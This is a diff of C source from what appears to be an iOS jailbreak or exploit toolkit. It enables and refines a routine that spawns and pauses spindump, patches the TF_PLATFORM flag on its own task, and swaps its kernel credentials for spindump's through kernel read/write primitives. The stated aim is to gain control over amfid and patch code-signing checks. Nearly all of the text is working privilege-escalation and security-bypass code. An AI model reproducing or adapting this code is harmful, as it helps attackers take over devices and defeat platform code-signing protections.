@@ -46,28 +46,42 @@
 
 pthread_attr_t pth_commAttr = {0};
 size_t amfid_fsize = 0;
-uint64_t myold_cred2 = 0;
 
-
-pid_t spindump_pid = 0;
+/* Spindump related variables */
+uint64_t self_cached_creds = 0;
 uint64_t spindump_proc_cred = 0;
+pid_t spindump_pid = 0;
+
+
 void safepatch_swap_spindump_cred(uint64_t target_proc){
     if(spindump_proc_cred == 0){
         spindump_pid = 0;
+        pid_t fpid = 0;
+        printf("-> Swapping spindump credentials....\t%s\n", look_for_proc("/usr/sbin/spindump") ? "(Spindump running already)" : "(Attempting to spawn spindump)");
+        
+        /*!
+         *  @discussion safepatch_swap_spindump_cred
+         *    Trying to spawn a new spindump process, as a pwnd child process
+         *    swapping the credentials with spindump <-> ourproc should
+         *    give us enough priviledges over the amfid process/task to
+         *    set the exception handler and apply our patches
+         *
+         */
+        
         if(!(spindump_pid = look_for_proc("/usr/sbin/spindump"))){
-            // if spindump is not running at moment
-            if(fork() == 0){
+            printf("-> Spawning spindump. This may take some time...\n");
+            if((fpid = fork()) == 0){
                 daemon(1, 1);
                 close(STDIN_FILENO);
                 close(STDOUT_FILENO);
                 close(STDERR_FILENO);
                 execvp("/usr/sbin/spindump", NULL);
                 exit(1);
-            } else printf("%s\n", strerror(errno));
-            while(!(spindump_pid = look_for_proc("/usr/sbin/spindump"))){
-                printf("Waiting for spindump to spawn... (%d)\n", look_for_proc("/usr/sbin/spindump"));
-            }
+            } else if(g_exp.debug){ printf("-> error: %s (%d)\n", strerror(errno), fpid); }
+            while(!(spindump_pid = look_for_proc("/usr/sbin/spindump"))){}
         }
+        
+        printf("-> Spindump process found:\n");
         printf("-> Pausing spindump process...\n");
         kill(spindump_pid, SIGSTOP);
         printf("-> Spindump pid:\t%d\n", spindump_pid);
@@ -77,10 +91,14 @@ void safepatch_swap_spindump_cred(uint64_t target_proc){
         printf("-> Spindump cred:\t0x%llx\n", spindump_proc_cred);
         kptr_t target_task = kapi_read_kptr(target_proc + OFFSET(proc, task));
         printf("-> target task:\t\t0x%llx\n", target_task);
-        patch_TF_PLATFORM(target_task);
-        printf("-> TF_PLATFORM patched\n");
-        myold_cred2 = kapi_read_kptr(target_proc + OFFSET(proc, p_ucred));
-        if(kapi_write64(target_proc + OFFSET(proc, p_ucred), spindump_proc_cred)) printf("-> Successfully swapped spindump credentials.\n");
+        printf("-> target proc:\t\t0x%llx\n", target_proc);
+        if(patch_TF_PLATFORM(target_task)){
+            printf("-> tf_platform patched successfully\n");
+            self_cached_creds = kapi_read_kptr(target_proc + OFFSET(proc, p_ucred));
+            if(kapi_write64(target_proc + OFFSET(proc, p_ucred), spindump_proc_cred)) printf("-> Successfully swapped spindump credentials.\n");
+        } else {
+            printf("-> failed to patch tf_platform!\n");
+        }
     }
 }
 
@@ -328,7 +346,7 @@ kptr_t perform_amfid_patches(){
     munmap(amfid_fdata, amfid_fsize);
 
     /** Swap Spindump creds with local ones */
-    // safepatch_swap_spindump_cred(g_exp.self_proc);
+    safepatch_swap_spindump_cred(g_exp.self_proc);
 
     kern_return_t ret = host_get_amfid_port(mach_host_self(), &amfid_task_port);
     if(ret == KERN_SUCCESS){
